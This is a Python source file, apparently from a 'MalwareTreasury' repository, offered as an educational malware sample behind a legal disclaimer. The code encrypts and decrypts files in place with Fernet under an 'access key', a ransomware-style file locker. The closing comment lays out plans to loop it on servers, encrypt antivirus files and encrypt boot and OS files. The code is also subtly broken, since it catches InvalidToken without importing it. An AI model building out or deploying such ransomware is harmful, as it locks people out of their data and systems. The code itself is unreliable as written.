'''
THIS CODE SHOULD ONLY USED FOR EDUCATIONAL PURPOSES 

Do not attempt to violate the law with anything contained here.
If you planned to use the content for illegal purpose, then please leave this site immediately! 
We will not be responsible for your illegal actions. 
Neither administration of this Repository, the authors of this material, or anyone else affiliated in any way, is going to accept responsibility for your actions.

Released and Licensed under the MIT License
Written by Prasanna
For More Malware Project Sample Codes ,CHECK OUT https://github.com/Prasanna1717/MalwareTreasury
'''

#CODE EXPLANATION
'''
Basically its a simple Python script that uses the Fernet module to encrypt and decrypt a file using a given key which called an access key. 
This key acts as an portal to enter also to lock your files in layman terms
It also includes a function that allows you to access the file by attempting to decrypt it with a given key, and returns an error message if the key is incorrect.
This process is called Cryptography.
'''


from cryptography.fernet import Fernet

def encrypt_file(file_name, key):
    # reads the file contents,Read Binary File Mode
    with open(file_name, 'rb') as f:
        file_contents = f.read()
    
    # generate a Fernet object using the key (Access key)
    #If this generated 
    fernet = Fernet(key)
    
    # encrypt the file contents
    encrypted_contents = fernet.encrypt(file_contents)
    
    # write the encrypted contents back to the file
    # Write binary file mode
    with open(file_name, 'wb') as f:
        f.write(encrypted_contents)

def decrypt_file(file_name, key):
    # read the encrypted file contents
    with open(file_name, 'rb') as f:
        encrypted_contents = f.read()
    
    # generate a Fernet object using the key
    fernet = Fernet(key)
    
    # decrypt the file contents
    decrypted_contents = fernet.decrypt(encrypted_contents)
    
    # write the decrypted contents back to the file
    with open(file_name, 'wb') as f:
        f.write(decrypted_contents)

def access_file(file_name, key):
    # generate a Fernet object using the key
    fernet = Fernet(key)
    
    try:
        # try to decrypt the file using the key
        decrypt_file(file_name, key)
        print("File decrypted successfully.")
    except InvalidToken:
        # if the key is incorrect, return an error message
        print("Invalid access file key. Cannot decrypt file.")

'''
If the access key in folder matches the fernet key while iterating through files.
All files be decryted to original state as before.

FUTURE OUTLOOK OF THIS PROGRAM
--This program can be automated as a loop running every 15 secs through Linux Systems/server Automation tools .
--Continues to encrypts the new antivirus files too.
--Can be rooted to Boot system file,which can also leads to encrytion of OS files too

THANK YOU
'''
